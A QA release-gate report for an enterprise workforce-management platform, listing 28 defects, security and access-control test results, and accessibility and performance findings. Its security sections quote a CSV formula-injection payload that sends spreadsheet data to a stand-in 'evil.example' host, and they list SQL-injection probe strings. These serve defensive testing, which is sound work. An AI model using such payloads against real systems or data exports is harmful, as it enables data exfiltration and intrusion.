# WFM Release Gate

Production-readiness test of the Enterprise WFM Platform · 31 October 2026

- Admin web app: `http://localhost:3000 (Vite dev)`
- Employee portal: `http://localhost:3001 (Vite dev)`
- Gateway: `http://localhost:4000` · Engine: `127.0.0.1:50051` · PostgreSQL 5432 (schema wfm, RLS on) · Redis 6379, NATS JetStream
- Branch: qa/production-readiness (from main @ 6820caf, with uncommitted engine/gateway changes in the working tree)
- Browser: Google Chrome (installed) via Playwright 1.64.1

## Verdict: NO-GO

Do not ship yet. Fix the 8 critical and high defects below, then re-run the suite. Access control, sign-in protection, scheduling rules and the main self-service flows held up well.

| Severity | Defects |
| --- | ---: |
| Critical | 2 |
| High | 6 |
| Medium | 11 |
| Low | 8 |
| Info | 1 |

| Area | Result |
| --- | --- |
| Screens tested | 51 admin + 5 portal, each with an accessibility scan |
| Access checks | 1,934 role × route checks over 327 guarded API routes · 0 leaks |
| Functional API checks | 94/99 passed |
| UI journeys (admin + portal) | 27/34 passed |
| Security attack tests | 10/16 passed |

## Must fix before launch

| ID | Severity | Title | Area |
| --- | --- | --- | --- |
| DEF-01 | Critical | A disabled user's existing session keeps working | Security · Administration |
| DEF-14 | Critical | Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down | Reliability · Engine (scheduling) |
| DEF-02 | High | Admin can book overlapping time off for the same person | Workforce · Time off |
| DEF-03 | High | Administrator uses a password on the app's own blocklist and is never asked to change it | Security · Configuration |
| DEF-04 | High | Ctrl+K search shows fake prototype records and cannot find real ones | Admin UI · Command palette |
| DEF-05 | High | Admin sidebar cannot be used with a keyboard or screen reader | Accessibility |
| DEF-06 | High | Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical) | Accessibility |
| DEF-07 | High | AG Grid Enterprise runs without a licence key | Release · Licensing |

## Module scorecard

Every admin screen was opened by URL and checked for crashes, uncaught errors, failing API calls and WCAG issues. Functional checks drive each module's API end to end.

| Module | Screens | Crashes | 5xx | Avg load | Functional | Worst open defect | Defects |
| --- | ---: | ---: | ---: | ---: | ---: | --- | --- |
| Overview | 1 | 0 | 0 | 2.7 s | — | None | — |
| Workforce | 7 | 0 | 0 | 2.9 s | 17/19 | High | DEF-02 DEF-23 |
| Forecasting | 8 | 0 | 0 | 3.5 s | 12/12 | Medium | DEF-13 |
| Scheduling (slowest: /scheduling/multi-site, 7.7 s) | 14 | 0 | 0 | 3.2 s | 14/14 | Critical | DEF-14 |
| Intraday & RTA | 4 | 0 | 0 | 2.3 s | 6/6 | None | — |
| Configuration | 9 | 0 | 0 | 2.9 s | 14/14 | High | DEF-03 DEF-07 DEF-19 |
| Data management | 3 | 0 | 0 | 3.3 s | 8/8 | Info | DEF-28 |
| Audit | 1 | 0 | 0 | 2.9 s | 2/3 | Medium | DEF-08 DEF-12 |
| Administration | 4 | 0 | 0 | 2.8 s | 3/4 | Critical | DEF-01 DEF-04 DEF-09 DEF-10 DEF-25 |
| Employee portal | 5 | 0 | 0 | 793 ms | 37/41 | Medium | DEF-17 DEF-20 DEF-21 DEF-22 |

Load times are from Vite dev servers (unbundled modules) and include waiting for every API call. Accessibility defects DEF-05, DEF-06 and DEF-18 apply to all admin modules and are listed once.

## All defects (28)

The same list is in `qa/reports/defects.csv` for import into Jira or Azure DevOps.

### DEF-01 · Critical · A disabled user's existing session keeps working

**Area:** Security · Administration

- **Steps:** Create user → sign in (token) → admin sets status DISABLED → call GET /api/v1/workforce/employees with the old token
- **Expected:** 401/403 at once
- **Actual:** 200 OK — the token works until it expires (JWT_TTL=12h). New sign-ins are refused correctly.
- **Evidence:** api-functional › Audit & Administration (existing session of disabled user is cut off → 200)
- **Fix:** In authenticate(), reject tokens whose user is no longer ACTIVE (cache status in Redis for a few seconds), or keep a per-user token version and bump it on disable/role change/password reset.

### DEF-14 · Critical · Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down

**Area:** Reliability · Engine (scheduling)

- **Steps:** Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran
- **Expected:** A failed solve fails that one request; the engine keeps serving
- **Actual:** 'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed
- **Evidence:** engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false
- **Fix:** Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false.

### DEF-02 · High · Admin can book overlapping time off for the same person

**Area:** Workforce · Time off

- **Steps:** POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17
- **Expected:** 400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')
- **Actual:** 201 Created — double-booked leave, double-counted balance and pay
- **Evidence:** api-functional › Workforce (overlapping time off rejected → 201)
- **Fix:** Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths).

### DEF-03 · High · Administrator uses a password on the app's own blocklist and is never asked to change it

**Area:** Security · Configuration

- **Steps:** Sign in as admin (tenant ORG)
- **Expected:** Strong password; temporary/bootstrap passwords force a change
- **Actual:** Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false
- **Evidence:** api-security SEC-01
- **Fix:** Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin.

### DEF-04 · High · Ctrl+K search shows fake prototype records and cannot find real ones

**Area:** Admin UI · Command palette

- **Steps:** Press Ctrl+K → type 'Jane' / 'Demo Support' / 'Shift Templates'
- **Expected:** Live employees, groups and screens
- **Actual:** 'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'
- **Evidence:** admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts
- **Fix:** Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle.

### DEF-05 · High · Admin sidebar cannot be used with a keyboard or screen reader

**Area:** Accessibility

- **Steps:** Load any admin screen → press Tab repeatedly
- **Expected:** Every navigation item is focusable (links/buttons)
- **Actual:** Only 1 focus stop in the sidebar in 40 Tabs — items are <div onClick> with no role or tabindex
- **Evidence:** admin-e2e A-03; src/components/layout/NavigationSidebar.tsx
- **Fix:** Render items as <a href> (they already have URLs) or <button>, with aria-current on the active one.

### DEF-06 · High · Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)

**Area:** Accessibility

- **Steps:** axe-core WCAG 2.1 AA scan of all 51 admin screens
- **Expected:** 0 critical violations
- **Actual:** button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen
- **Evidence:** admin-crawl (axe) — see Accessibility section
- **Fix:** Add aria-label to icon buttons (lucide icons inside <button>), label selects/inputs.

### DEF-07 · High · AG Grid Enterprise runs without a licence key

**Area:** Release · Licensing

- **Steps:** Open Workforce › Employees (console)
- **Expected:** Licensed grid, no watermark
- **Actual:** Console prints the AG Grid Enterprise licence banner; grids show the trial watermark
- **Evidence:** admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities
- **Fix:** Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence.

### DEF-08 · Medium · CSV formula injection in the audit export

**Area:** Security · Audit export

- **Steps:** Create a team named =HYPERLINK("http://evil.example/?x="&A1,"x") → download /audit/export.csv
- **Expected:** Cell neutralised ('=…)
- **Actual:** Written raw: "=HYPERLINK(""http://evil.example/…"")" — runs when opened in Excel
- **Evidence:** api-security SEC-14
- **Fix:** Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer.

### DEF-09 · Medium · Session token accepted in the URL (?token=) on every REST route

**Area:** Security · Sessions

- **Steps:** GET /api/v1/users?token=<jwt>
- **Expected:** 401 (header only)
- **Actual:** 200; the web app also opens /ws?token=<jwt>
- **Evidence:** api-security SEC-05
- **Fix:** Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs.

### DEF-10 · Medium · Response time reveals whether a username exists

**Area:** Security · Sign-in

- **Steps:** POST /auth/login with a wrong password for a real vs an unknown username (5 each)
- **Expected:** Same timing
- **Actual:** Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)
- **Evidence:** api-security SEC-07
- **Fix:** When no user is found, bcrypt.compare against a fixed dummy hash before failing.

### DEF-11 · Medium · Impossible calendar date returns 500 and leaks the PostgreSQL error

**Area:** API · Validation

- **Steps:** POST /me/time-off {startDate:'2026-02-30', endDate:'2026-02-30'}
- **Expected:** 400 'not a valid date'
- **Actual:** 500 'date/time field value out of range: "2026-02-30"'
- **Evidence:** api-security SEC-15
- **Fix:** isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500.

### DEF-12 · Medium · Failed sign-in attempts are not written to the audit log

**Area:** Audit

- **Steps:** Fail a sign-in for admin → search audit
- **Expected:** LOGIN_FAILED entry with IP
- **Actual:** Only successful LOGIN is audited (lockouts are in Redis only)
- **Evidence:** api-functional › Audit
- **Fix:** Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence).

### DEF-13 · Medium · Forecast Builder takes ~34 s to finish loading

**Area:** Performance · Forecasting

- **Steps:** Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)
- **Expected:** < 3 s
- **Actual:** GET /forecast/history-quality takes 15–32 s and is requested twice on every load
- **Evidence:** performance PERF-03 + request timing
- **Fix:** Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen.

### DEF-15 · Medium · Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)

**Area:** Performance

- **Steps:** vite build
- **Expected:** Route-level code splitting, main chunk < 500 kB
- **Actual:** index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size
- **Evidence:** static/build-admin.txt
- **Fix:** Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used.

### DEF-16 · Medium · Employee list is not paginated

**Area:** Performance · Scale

- **Steps:** GET /workforce/employees (≈ 420 people)
- **Expected:** Paged/filtered
- **Actual:** 328 kB per call; 40 req/s with p95 627 ms at 25 concurrent
- **Evidence:** performance PERF-01/02
- **Fix:** Server-side paging and field selection; the grid can use the AG Grid server-side row model.

### DEF-17 · Medium · Portal is not usable on a phone browser

**Area:** Employee portal · Mobile

- **Steps:** Open localhost:3001 at 412 px width (Pixel 7)
- **Expected:** Responsive layout / bottom tabs
- **Actual:** Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways
- **Evidence:** responsive R-01, screens/mobile-portal-*.png
- **Fix:** Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app).

### DEF-18 · Medium · Colour contrast below WCAG AA on every screen of both apps

**Area:** Accessibility

- **Steps:** axe scan
- **Expected:** 4.5:1 for text
- **Actual:** 822 elements on 51/51 admin screens; portal login and 4/5 sections
- **Evidence:** admin-crawl, portal-e2e P-01/P-03
- **Fix:** Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds.

### DEF-19 · Medium · NATS TLS certificate checking is switched off

**Area:** Security · Configuration

- **Steps:** backend/.env
- **Expected:** NATS_TLS_REJECT_UNAUTHORIZED=true in production
- **Actual:** false
- **Evidence:** backend/.env (value only, no secret read)
- **Fix:** Set to true with a trusted CA for production.

### DEF-20 · Low · Offers show an empty group name to the employee

**Area:** Employee portal

- **Steps:** GET /me/offers as an agent
- **Expected:** groupName 'Demo Support' (as admin sees)
- **Actual:** groupName ""
- **Evidence:** api-functional › Self-service
- **Fix:** Join the group name in the /me/offers query.

### DEF-21 · Low · No URLs per section: reload always returns to Home, Back leaves the app

**Area:** Employee portal · UX

- **Steps:** Open Inbox → reload
- **Expected:** Stay on Inbox (admin app already has per-screen URLs)
- **Actual:** Back on Home; nothing can be bookmarked or linked from a notification e-mail
- **Evidence:** portal-e2e P-08
- **Fix:** Use the same History-API routing as src/services/routes.ts.

### DEF-22 · Low · Time-off form accepts end-before-start until it is submitted

**Area:** Employee portal · UX

- **Steps:** Request time off → Start = day 60, End = day 55
- **Expected:** Inline error, Submit disabled
- **Actual:** Submit enabled; the server's 400 message is shown afterwards
- **Evidence:** portal-e2e P-05
- **Fix:** Validate in the form (it already pre-checks overlaps).

### DEF-23 · Low · Hire date in 2099 is accepted

**Area:** Workforce · Validation

- **Steps:** POST /workforce/employees hireDate 2099-01-01
- **Expected:** 400 (e.g. > 1 year ahead)
- **Actual:** 201
- **Evidence:** api-functional › Workforce
- **Fix:** Bound hire dates.

### DEF-24 · Low · Malformed JSON returns error code INTERNAL

**Area:** API

- **Steps:** POST /config/groups with body '{"name":'
- **Expected:** 400 BAD_JSON
- **Actual:** 400 with code INTERNAL
- **Evidence:** api-security SEC-12
- **Fix:** Map body-parser SyntaxError to a 400 BAD_REQUEST code.

### DEF-25 · Low · Unauthenticated endpoints reveal account existence and organisation name

**Area:** Security · Sign-in

- **Steps:** POST /auth/discover {identifier:<email>}; GET /auth/login-options
- **Expected:** Off in production unless needed
- **Actual:** Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)
- **Evidence:** api-security SEC-08
- **Fix:** Set LOGIN_DISCOVERY=false for production if the org code is distributed another way.

### DEF-26 · Low · No favicon — 404 on every page load

**Area:** Both apps

- **Steps:** GET /favicon.ico on :3000 and :3001
- **Expected:** 200
- **Actual:** 404 (console error on every screen)
- **Evidence:** admin-crawl console
- **Fix:** Add a favicon to public/.

### DEF-27 · Low · scripts/demo-seed.mjs cannot finish

**Area:** Tooling

- **Steps:** Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)
- **Expected:** Seed completes
- **Actual:** The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again
- **Evidence:** qa/seed-finish.mjs works around it
- **Fix:** Change the demo logins' passwords in the seed; make the seed resumable.

### DEF-28 · Info · Existing data to clean before go-live

**Area:** Data hygiene

- **Steps:** Configuration › Integration Station; Data Management › Staged imports
- **Expected:** —
- **Actual:** A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.
- **Evidence:** admin-crawl visible errors
- **Fix:** Start production from a clean database; do not migrate this test data.

## Security

| Test | Result | What was checked | Evidence |
| --- | --- | --- | --- |
| SEC-01 | ❌ Fail | Administrator signs in with a password on the app's own blocklist, and is not forced to change it | {"mustChangePassword":false,"containsUsername":true} |
| SEC-02 | ✅ Pass | Password policy enforced on change | ["short1! -> 400 Use at least 8 characters.","password123 -> 400 That password is too easy to guess. Avoid common words and number runs.","demo.agent1-xyz9 -> 400 The password cannot contain your username.","abcdefghij - |
| SEC-03 | ✅ Pass | JWT forgery (alg:none, role swap, bad signature, expired) rejected | {"algNone":401,"roleSwap":401,"badSig":401,"expired":401,"garbage":401} |
| SEC-04 | ✅ Pass | Token revoked after logout | {"after":401} |
| SEC-05 | ❌ Fail | Bearer token accepted as ?token= on every REST route (and used for /ws); leaks into logs, history, Referer | {"status":200} |
| SEC-06 | ✅ Pass | Login throttled after 10 failures (per IP + username, 15 min) | {"codes":[401,401,401,401,401,401,401,401,401,401,429,429]} |
| SEC-07 | ❌ Fail | Login response time reveals whether a username exists (bcrypt only runs for real users) | {"knownMedianMs":409,"unknownMedianMs":6} |
| SEC-08 | ❌ Fail | Unauthenticated /auth/discover and /auth/login-options reveal account existence and organisation name | {"discoverHit":{"organisations":[{"code":"ORG","name":"My Organisation"}]},"discoverMiss":{"organisations":[]},"loginOptions":{"singleOrganisation":{"code":"ORG","name":"My Organisation"},"discovery":true}} |
| SEC-09 | ✅ Pass | Gateway security headers (helmet) | {"content-security-policy":"default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style- |
| SEC-10 | ✅ Pass | CORS allow-list (only the admin origin; the portal goes through its Vite proxy) | {"evilACAO":null,"portalACAO":null} |
| SEC-11 | ✅ Pass | SQL injection probes (login, search, ids) handled without 5xx | ["login ' OR '1'='1 -> 401","/workforce/employees?q='%20OR%20'1'%3D'1 -> 200","/audit?search='%20OR%20'1'%3D'1 -> 200","/auth/org/'%20OR%20'1'%3D'1 -> 404","/scheduling/versions/'%20OR%20'1'%3D'1 -> 400","login '; DROP T |
| SEC-12 | ✅ Pass | Malformed JSON / 15MB body / 5000-char name | {"malformed":400,"malformedBody":"INTERNAL","over14mb":413,"team5000chars":400,"team5000msg":"Invalid input: name String must contain at most 80 character(s)"} |
| SEC-13 | ✅ Pass | Cross-agent access to time-off/swaps | {"agent2Schedule":"object","agent2Swaps":200,"createTimeOff":"201 ","agent1 cancels agent2 request":404,"agent2 request visible to agent1":false,"agent2 cancels own":200,"agent2 gives away agent1 shift":"400 That is not  |
| SEC-14 | ❌ Fail | Audit CSV export writes user-entered names that start with = unescaped (formula injection when opened in Excel) | {"teamCreate":201,"csvLine":"1554,2026-10-31T13:26:24.866Z,Administrator,WFM_ADMIN,CREATE,TEAM,f885eb0b-cb60-4d3d-aa6e-094bb7b6c2b3,\"=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"QA182778\"\")\",,,API,::1,bcc502c8-d |
| SEC-15 | ❌ Fail | Impossible calendar date (2026-02-30) returns 500 and leaks the raw PostgreSQL error | {"out":{"reversed":"400 The end date is before the start date.","tenYears":"400 Ask for at most 90 days at a time.","past":"400 That date has already passed. Only sick leave can be recorded after the fact.","badDay":"500 |
| SEC-16 | ✅ Pass | Error responses do not leak stack/SQL | {"status":400,"body":"{\"error\":{\"code\":\"VALIDATION\",\"message\":\"Invalid input: body Invalid uuid\",\"details\":[{\"field\":\"\",\"message\":\"Invalid uuid\"}],\"requestId\":\"896598cc-ba6b-4965-be82-dd7a555e2e64\ |

## Access control (RBAC)

Routes and their required permissions were read from the gateway source (352 routes, 327 guarded). Each role called every route it lacks permission for (must be 403) and every GET it is allowed (must not be 401/403 or 5xx).

| Caller | Calls | Leaks | Wrongly blocked | 5xx | Result |
| --- | ---: | ---: | ---: | ---: | --- |
| Signed out | 327 | 0 | — | — | ✅ Pass |
| WFM_MANAGER | 168 | 0 | 0 | 0 | ✅ Pass |
| FORECAST_PLANNER | 282 | 0 | 0 | 0 | ✅ Pass |
| SCHEDULER | 250 | 0 | 0 | 0 | ✅ Pass |
| SUPERVISOR_RTA | 297 | 0 | 0 | 0 | ✅ Pass |
| ANALYST | 300 | 0 | 0 | 0 | ✅ Pass |
| AGENT | 310 | 0 | 0 | 0 | ✅ Pass |

## Accessibility (axe-core, WCAG 2.1 A + AA)

| Rule | Impact | Screens | Elements | Meaning |
| --- | --- | ---: | ---: | --- |
| button-name | critical | 51/51 | 530 | Buttons must have discernible text |
| label | critical | 1/51 | 12 | Form elements must have labels |
| select-name | critical | 1/51 | 1 | Select element must have an accessible name |
| color-contrast | serious | 51/51 | 822 | Elements must meet minimum color contrast ratio thresholds |
| dlitem | serious | 1/51 | 10 | <dt> and <dd> elements must be contained by a <dl> |
| definition-list | serious | 1/51 | 1 | <dl> elements must only directly contain properly-ordered <dt> and <dd> groups, <script>, <template> or <div> elements |

Keyboard: the admin sidebar is built from clickable `<div>`s; 40 Tab presses reached it once (DEF-05).

## Performance (one machine, dev servers — indicative)

### API reads (15 calls each)

| Endpoint | p50 | p95 | Size |
| --- | ---: | ---: | ---: |
| /auth/me | 4 ms | 5 ms | 1 kB |
| /config/groups | 4 ms | 5 ms | 4 kB |
| /workforce/employees | 42 ms | 55 ms | 328 kB |
| /scheduling/versions | 7 ms | 11 ms | 43 kB |
| /scheduling/versions/:id/shifts | 16 ms | 19 ms | 169 kB |
| /forecast/versions | 4 ms | 5 ms | 6 kB |
| /intraday/coverage?groupId=:group | 37 ms | 43 ms | 25 kB |
| /intraday/adherence?groupId=:group | 11 ms | 23 ms | 6 kB |
| /audit | 6 ms | 9 ms | 53 kB |
| /me/home | 10 ms | 20 ms | 1 kB |
| /me/schedule | 8 ms | 11 ms | 8 kB |
| /me/time-off | 6 ms | 9 ms | 3 kB |

### Page load

| Screen | First paint | All data loaded | API calls |
| --- | ---: | ---: | ---: |
| /overview | 1.5 s | 2.3 s | 15 |
| /workforce/employees | 869 ms | 1.5 s | 18 |
| /forecasting/forecast-dashboard | 835 ms | 1.6 s | 11 |
| /forecasting/forecast-builder | 637 ms | 34.1 s | 20 |
| /scheduling/schedule-timeline | 660 ms | 2.0 s | 22 |
| /intraday/live-coverage | 594 ms | 1.2 s | 10 |
| /forecasting/accuracy-heatmap | 452 ms | 3.4 s | 12 |

### Concurrency (25 parallel × 4 waves)

| Endpoint | Requests | Req/s | p50 | p95 | Status codes |
| --- | ---: | ---: | ---: | ---: | --- |
| /workforce/employees | 100 | 40 | 538 ms | 627 ms | {"200":100} |
| /config/groups | 100 | 501 | 37 ms | 49 ms | {"200":100} |
| /scheduling/versions | 100 | 326 | 55 ms | 76 ms | {"200":100} |
| POST /auth/login x10 concurrent | 10 | — | — | 4179 ms | {"200":10} |

### Phone layout (412 px)

| App | Content width | Sidebar | Result |
| --- | ---: | ---: | --- |
| Employee portal | 188 px | 224 px | ❌ Squeezed |
| Admin app | 172 px | 240 px | ❌ Squeezed |

## Builds and the project's own tests

| Check | Result | Detail |
| --- | --- | --- |
| TypeScript — admin web app | ✅ Pass | 0 errors |
| TypeScript — employee portal | ✅ Pass | 0 errors |
| TypeScript — gateway | ✅ Pass | 0 errors |
| Production build — admin | ✅ Pass | 4,233.76 kB / gzip 1,180.34 kB (one chunk) |
| Production build — portal | ✅ Pass | 281.29 kB / gzip 85.22 kB |
| Secrets scan of both bundles | ✅ Pass | No keys, connection strings or passwords; JWT_SECRET appears only as help text |
| Engine unit tests (pytest) | ✅ Pass | 91 passed in 4 min |
| Gateway's own API suite (75 files) | ❌ Fail | 580/683 passed, 77 failed, 20 cancelled · 6 min. Not a clean signal: it shares the dev database and gateway (its README asks for an empty database on :4001 with FORCE_PASSWORD_CHANGE=false); failures are mostly test users stopped by the forced password change, the engine crash (DEF-14), and knock-on failures. Re-run it in CI on an empty database before release. |

## What works well

- Role-based access control: 1,934 role × route checks over 327 guarded routes and 6 roles — no route answered without its permission, no role wrongly blocked, every guarded route returns 401 when signed out.
- Token security: alg:none, role-swapped payload, bad signature, expired and garbage tokens all rejected; sign-out revokes the token server-side.
- Brute force: sign-in locks after 10 failures per IP+user; password change locks after 5; password policy rejects short, common, username-based and repeated-character passwords.
- Injection: SQL-injection probes on sign-in, search and IDs gave no 5xx and no bypass; HTML in names and reasons renders as text (no dangerouslySetInnerHTML anywhere).
- Tenant/employee isolation: an agent cannot see, cancel or give away another agent's requests or shifts; mass-assignment fields are ignored.
- Validation is strong across configuration (duplicates, time zones, SL > 100 %, queue hours), templates, forecast lifecycle (no publish before approve, no deleting a published forecast) and live feeds (negative volume, future events, unknown agents).
- Scheduling quality: published 2-week schedule (282 shifts, 30 people) has 0 double-bookings, ≥ 11 h rest everywhere, ≤ 48 h/week, ≤ 6 days in a row; swap takes are refused when they would break rest/hours rules.
- Self-service flows work end-to-end in the portal: forced first-login password change, time off (auto-approval by policy, overlap check), giveaways, VTO accept, overtime decline, inbox, sign-out.
- API reads are fast (most 4–55 ms p95) and returned no 5xx under 25-way concurrency.
- Headers: Helmet CSP, HSTS, X-Frame-Options, nosniff, no X-Powered-By; CORS allows only the admin origin.
- Builds and checks: TypeScript clean in admin, portal and gateway; both production builds succeed; no secrets in the bundles; engine unit suite 91/91.

## Method and limits

**Covered:** manual and exploratory review of every screen in Chrome; automated UI (Playwright + Chrome): 51-screen crawl, admin and portal journeys, phone layout; API functional checks per module, role-based access over every guarded route, attack tests; route inventory and permission map generated from the gateway source; performance baseline, production builds, type checks, the engine's and the gateway's own suites.

**Not covered:** a second tenant (cross-tenant isolation), single sign-on, SCIM, e-mail/SMS delivery, webhooks, the native mobile app, production infrastructure (TLS, proxy, backups), load beyond 25 concurrent requests, browsers other than Chrome, a screen-reader walkthrough.

**Re-run:**

```powershell
cd qa
npm install
$env:QA_ADMIN_PASSWORD='…'          # test stack only — the suite creates QA- data
npx playwright test
node tools/build-report.mjs
node tools/build-markdown.mjs
```
